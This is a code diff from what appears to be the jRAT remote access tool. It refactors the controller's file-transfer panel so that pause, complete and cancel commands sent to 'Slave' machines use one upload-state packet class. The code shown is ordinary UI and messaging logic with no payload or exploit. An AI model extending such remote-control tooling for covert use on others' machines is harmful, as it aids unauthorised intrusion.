@@ -10,12 +10,11 @@ import jrat.common.io.TransferData.State;
 import jrat.common.utils.DataUnits;
 import jrat.common.utils.MathUtils;
 import jrat.controller.Slave;
-import jrat.controller.packets.outgoing.Packet103CompleteServerUpload;
 import jrat.controller.ui.DefaultJTable;
 import jrat.controller.ui.DefaultJTableCellRenderer;
 import jrat.controller.ui.components.TableModel;
 import jrat.controller.utils.Utils;
-import jrat.module.fs.packets.Packet102ServerUpload;
+import jrat.module.fs.packets.upload.Packet102UploadState;
 
 import javax.swing.*;
 import javax.swing.event.PopupMenuEvent;
@@ -178,7 +177,7 @@ public class PanelFileTransfers extends ClientPanel {
                 if (d.isUpload()) {
                     d.getRunnable().pause();
                 } else {
-                    ((Slave)d.getObject()).addToSendQueue(new Packet102ServerUpload(Transfer.PAUSE, d.getRemoteFile()));
+                    ((Slave)d.getObject()).addToSendQueue(new Packet102UploadState(Transfer.PAUSE, d.getRemoteFile()));
                 }
             }
         }
@@ -195,10 +194,10 @@ public class PanelFileTransfers extends ClientPanel {
 
                 if (d.isUpload()) {
                     d.getRunnable().interrupt();
-                    ((Slave)d.getObject()).addToSendQueue(new Packet103CompleteServerUpload(d.getRemoteFile()));
+                    ((Slave)d.getObject()).addToSendQueue(new Packet102UploadState(Transfer.Complete, d.getRemoteFile()));
                 } else {
                     FileCache.remove(d.getLocalFile().getAbsolutePath());
-                    ((Slave)d.getObject()).addToSendQueue(new Packet102ServerUpload(Transfer.CANCEL, d.getRemoteFile()));
+                    ((Slave)d.getObject()).addToSendQueue(new Packet102UploadState(Transfer.CANCEL, d.getRemoteFile()));
                 }
             }
         }
